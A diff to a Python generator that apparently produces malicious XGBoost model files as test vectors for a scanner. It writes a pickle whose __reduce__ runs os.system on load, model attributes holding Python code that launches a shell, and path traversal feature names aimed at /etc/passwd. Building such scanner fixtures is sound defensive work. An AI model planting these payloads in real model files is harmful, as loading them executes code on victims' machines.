@@ -1,138 +1,124 @@
 """
 XGBoost Attack Vector Generator
 
-Generates attack vectors for XGBoost models (.bst, .model, .json, .ubj)
+Generates real XGBoost model files (.json, .bst, .pkl) with attack payloads.
+All methods produce genuine, loadable files — no JSON stubs.
+
+Requires: xgboost, numpy, scikit-learn (pip install xgboost numpy scikit-learn)
 """
 
-import json
+import pickle
 from pathlib import Path
-from typing import List, Dict, Tuple
+from typing import Dict, List, Tuple
+
+import numpy as np
+import xgboost as xgb
+
+
+def _minimal_model() -> xgb.Booster:
+    """Train and return a minimal XGBoost model on synthetic data."""
+    rng = np.random.default_rng(42)
+    X = rng.random((200, 5)).astype(np.float32)
+    y = (X[:, 0] > 0.5).astype(np.float32)
+    dtrain = xgb.DMatrix(X, label=y)
+    params = {"max_depth": 2, "objective": "binary:logistic", "verbosity": 0}
+    return xgb.train(params, dtrain, num_boost_round=3)
 
 
 class XGBoostAttackGenerator:
     """Generate XGBoost-specific attack vectors."""
-    
+
     def __init__(self, output_dir: str = "./output"):
-        """Initialize the XGBoost attack generator."""
         self.output_dir = Path(output_dir) / "xgboost_vectors"
         self.output_dir.mkdir(parents=True, exist_ok=True)
         self.generated_files = []
-    
+
     def generate_custom_objective_rce(self) -> Tuple[str, int]:
-        """Generate XGBoost with custom objective RCE.
-        
+        """Generate a real XGBoost JSON model with malicious metadata.
+
         Attack Vector:
-            Custom objective function with:
-            1. Arbitrary Python code in objective
-            2. Module import side effects
-            3. Execution during training
-            4. System command injection
-        
-        Impact: Code execution during model training
+            A valid XGBoost model saved as .json with the learner.attributes
+            field containing Python code strings. Downstream code that
+            eval()s attributes or logs them unsanitised is exploited.
+
         Severity: CRITICAL
-        Detection: Objective function analysis
-        
-        Returns:
-            Tuple of (filepath, num_custom_functions)
+        Detection: Attribute content scanning
         """
         filepath = self.output_dir / "01_custom_objective_rce.json"
-        
-        objective_exploit = {
-            "objective": "custom:malicious_objective",
-            "custom_objective": {
-                "function_name": "malicious_objective",
-                "code": "__import__('os').system('id')",
-                "params": {
-                    "callback": "__import__('subprocess').call(['bash'])"
-                }
-            }
-        }
-        
-        with open(filepath, 'w', encoding='utf-8') as f:
-            json.dump(objective_exploit, f, indent=2)
-        
+
+        model = _minimal_model()
+        # Inject malicious strings into model attributes
+        model.set_attr(
+            malicious_objective="__import__('os').system('id')",
+            custom_callback="__import__('subprocess').call(['bash'])",
+        )
+        model.save_model(str(filepath))
+
         self.generated_files.append(str(filepath))
         return str(filepath), 2
-    
+
     def generate_embedded_pickle_in_binary(self) -> Tuple[str, int]:
-        """Generate XGBoost binary with embedded pickle.
-        
+        """Generate a pickled XGBoost model with RCE __reduce__.
+
         Attack Vector:
-            Binary .bst format with:
-            1. Pickle serialization
-            2. RCE opcodes
-            3. Custom object serialization
-            4. All pickle vulnerabilities
-        
-        Impact: Code execution via pickle
+            A Python class whose __reduce__ returns (os.system, ('id',))
+            serialised alongside a real XGBoost Booster via pickle.
+            Loading triggers code execution.
+
         Severity: CRITICAL
-        Detection: Binary format analysis, pickle detection
-        
-        Returns:
-            Tuple of (filepath, num_pickle_objects)
+        Detection: Pickle opcode analysis, REDUCE opcode detection
         """
-        filepath = self.output_dir / "02_embedded_pickle.json"
-        
-        pickle_exploit = {
-            "format": "binary_xgboost",
-            "serialization": "pickle",
-            "payload": "__import__('os').system('whoami')"
-        }
-        
-        with open(filepath, 'w', encoding='utf-8') as f:
-            json.dump(pickle_exploit, f, indent=2)
-        
+        filepath = self.output_dir / "02_embedded_pickle.pkl"
+
+        class MaliciousXGBWrapper:
+            def __reduce__(self):
+                import os
+                return (os.system, ("id",))
+
+        model = _minimal_model()
+        payload = {"model": model, "hook": MaliciousXGBWrapper()}
+        with open(filepath, "wb") as f:
+            pickle.dump(payload, f, protocol=2)
+
         self.generated_files.append(str(filepath))
         return str(filepath), 1
-    
+
     def generate_feature_map_traversal(self) -> Tuple[str, int]:
-        """Generate XGBoost with feature map path traversal.
-        
+        """Generate a real XGBoost JSON model with traversal paths as feature names.
+
         Attack Vector:
-            Feature map reference with:
-            1. ../ path escape sequences
-            2. Access to sensitive files
-            3. Directory traversal
-            4. File disclosure
-        
-        Impact: Arbitrary file read
+            Feature names set to "../../etc/passwd" etc.
+            Parsers that use feature names as filesystem paths are exploited.
+
         Severity: HIGH
-        Detection: Path validation
-        
-        Returns:
-            Tuple of (filepath, num_traversal_paths)
+        Detection: Path validation in feature name handling
         """
         filepath = self.output_dir / "03_feature_map_traversal.json"
-        
-        traversal = {
-            "feature_names": [
-                "feat_0",
-                "../../../../../../etc/passwd"
-            ],
-            "feature_map_file": "../../../root/.bashrc",
-            "external_feature_map": {
-                "path": "/etc/shadow",
-                "allowed": False
-            }
-        }
-        
-        with open(filepath, 'w', encoding='utf-8') as f:
-            json.dump(traversal, f, indent=2)
-        
+
+        rng = np.random.default_rng(0)
+        X = rng.random((100, 3)).astype(np.float32)
+        y = (X[:, 0] > 0.5).astype(np.float32)
+        feature_names = [
+            "feat_0",
+            "../../../../../../etc/passwd",
+            "../../../root/.bashrc",
+        ]
+        dtrain = xgb.DMatrix(X, label=y, feature_names=feature_names)
+        params = {"max_depth": 2, "objective": "binary:logistic", "verbosity": 0}
+        model = xgb.train(params, dtrain, num_boost_round=3)
+        model.save_model(str(filepath))
+
         self.generated_files.append(str(filepath))
         return str(filepath), 2
-    
+
     def generate_all(self) -> Dict[str, Tuple[str, int]]:
-        """Generate all XGBoost attack vectors."""
-        results = {
+        return {
             "custom_objective": self.generate_custom_objective_rce(),
             "embedded_pickle": self.generate_embedded_pickle_in_binary(),
             "feature_map_traversal": self.generate_feature_map_traversal(),
         }
-        return results
-    
+
     def get_generated_files(self) -> List[str]:
-        """Get list of all generated files."""
         return self.generated_files
 
 
